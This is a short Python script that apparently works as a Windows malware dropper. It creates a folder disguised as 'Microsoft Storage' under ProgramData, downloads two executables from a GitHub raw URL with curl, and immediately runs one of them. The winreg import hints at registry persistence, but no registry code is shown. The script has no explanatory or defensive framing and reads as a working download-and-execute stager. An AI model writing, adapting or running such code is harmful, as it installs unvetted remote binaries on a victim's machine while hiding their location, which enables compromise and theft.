import os
import subprocess
import getpass
import winreg

directory = "C:/ProgramData/Microsoft Storage"
os.makedirs(directory, exist_ok=True)
os.chdir(directory)

files = ["clo.exe", "file.exe"]

for file in files:
    subprocess.run(["curl", "-O", f"https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/{file}"], 
               capture_output=True, shell=True)


os.system("file.exe")
